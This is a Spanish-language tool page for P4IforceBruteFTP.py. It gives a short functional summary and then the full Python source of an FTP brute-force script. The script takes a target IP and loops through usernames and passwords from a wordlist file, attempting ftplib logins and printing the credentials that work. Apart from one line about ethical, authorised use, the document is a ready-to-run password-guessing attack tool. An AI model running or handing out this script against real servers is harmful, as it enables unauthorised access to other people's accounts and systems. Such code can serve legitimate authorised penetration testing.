# 👹 FUERZA BRUTA A FTP             P4IforceBruteFTP.py

`P4IforceBruteFTP.py` es un script diseñado para automatizar la prueba de fuerza bruta en conexiones FTP (Protocolo de Transferencia de Archivos). Aquí tienes un resumen de su funcionalidad:

1. **Banner de Bienvenida:** Muestra un banner de bienvenida al usuario cuando ejecuta el programa.
2. **Colores ANSI:** Define códigos de colores ANSI para mejorar la presentación de la salida en la consola.
3. **Función de Fuerza Bruta (`fuerzabruta`):** Define una función que intenta iniciar sesión en un servidor FTP con un nombre de usuario y contraseña dados. Registra si la prueba fue exitosa o falló.
4. **Función Principal (`main`):** Solicita al usuario la dirección IP del objetivo y si ya tiene un nombre de usuario. Luego, lee listas de nombres de usuario y contraseñas de un archivo llamado `listaUsyPasw.txt`. Para cada combinación de usuario y contraseña, realiza una prueba de fuerza bruta llamando a la función `fuerzabruta`.
5. **Manejo de Excepciones (`try`/`except`):** Maneja la interrupción del teclado (Ctrl+C) para finalizar el programa de manera ordenada si el usuario decide detener la ejecución.

En resumen, este script intenta automatizar el proceso de prueba de fuerza bruta en conexiones FTP para un servidor especificado, utilizando nombres de usuario y contraseñas proporcionados en un archivo. Cabe mencionar que el uso de herramientas de prueba de fuerza bruta debe realizarse ética y legalmente, preferiblemente con el permiso del propietario del sistema o la aplicación.

````python
// Some code

```python
#!programa para automatizar la prueba de usuarios y contraseñas a una conexion FTP -  P4IforceBruteFTP.py - By P4IM0N

#-----------------------------------------------------------------------------------------------------------------
import ftplib
from tabulate import tabulate
import time

#-----------------------------------------------------------------------------------------------------------------
# Colores ANSI
COLOR_VERDE = "\033[92m"
COLOR_ROJO = "\033[91m"
COLOR_PURPURA = "\033[95m"
COLOR_RESET = "\033[0m"  # Restablecer el color

#-----------------------------------------------------------------------------------------------------------------
banner= f'''{COLOR_ROJO}

__________  _____ .___  _____                         __________                __        ________________________________ 
\______   \/  |  ||   |/ ____\___________   ____  ____\______   \_______ __ ___/  |_  ____\_   _____/\__    ___/\______   |
 |     ___/   |  ||   \   __\/  _ \_  __ \_/ ___\/ __ \|    |  _/\_  __ \  |  \   __\/ __ \|    __)    |    |    |     ___/
 |    |  /    ^   /   ||  | (  <_> )  | \/\  \__\  ___/|    |   \ |  | \/  |  /|  | \  ___/|     \     |    |    |    |    
 |____|  \____   ||___||__|  \____/|__|    \___  >___  >______  / |__|  |____/ |__|  \___  >___  /     |____|    |____|    
              |__|                             \/    \/       \/                         \/    \/                          
{COLOR_RESET}{COLOR_PURPURA}By P4IM0N{COLOR_RESET}'''

print(banner)

#-----------------------------------------------------------------------------------------------------------------
def fuerzabruta(ip,usuario,contraseña):
    pruebas = []
    conexion_ftp = ftplib.FTP(ip)
    try:
        conexion_ftp.login(usuario,contraseña)
        conexion_ftp.quit()
        pruebas.append([f'CORRECTA: {usuario} : {contraseña}'])
        tabla_prueba = tabulate(pruebas,['PRUEBA'],tablefmt='grid')
        print(COLOR_VERDE+tabla_prueba+COLOR_RESET)
    except:
        pruebas.append([f'INCORRECTA: {usuario} : {contraseña}'])
        tabla_prueba = tabulate(pruebas,['PRUEBA'],tablefmt='grid')
        print(COLOR_ROJO+tabla_prueba+COLOR_RESET)    


#-----------------------------------------------------------------------------------------------------------------
def main():
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    ip_objetivo = input('Manito dame la IP objetivo para aplicarle fuerza bruta:  ')
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    existe_usuario = input('Manito tienes un nombre de USUARIO? (s/n):  ')
    print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
    usuarios = open('listaUsyPasw.txt','r')
    usuarios = usuarios.read().split('\n')
    contraseñas = open('listaUsyPasw.txt','r')
    contraseñas = contraseñas.read().split('\n')
    if existe_usuario == 's':
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        usuario_aportado = input('Manito dame el nombre de usuario que tienes para hacer fuerza bruta a su contraseña:  ')
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        for passw in contraseñas:
            time.sleep(1)
            fuerzabruta(ip_objetivo,usuario_aportado,passw)
    else:     
        for user in usuarios:
            for passw in contraseñas:
                time.sleep(1)
                fuerzabruta(ip_objetivo,user,passw)
    


#-----------------------------------------------------------------------------------------------------------------
if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        print('Manito hasta la proximaaaa ')
        print(f'{COLOR_PURPURA}----------------------------------------------------------------------------------{COLOR_RESET}')
        exit()    


#-----------------------------------------------------------------------------------------------------------------
```
````
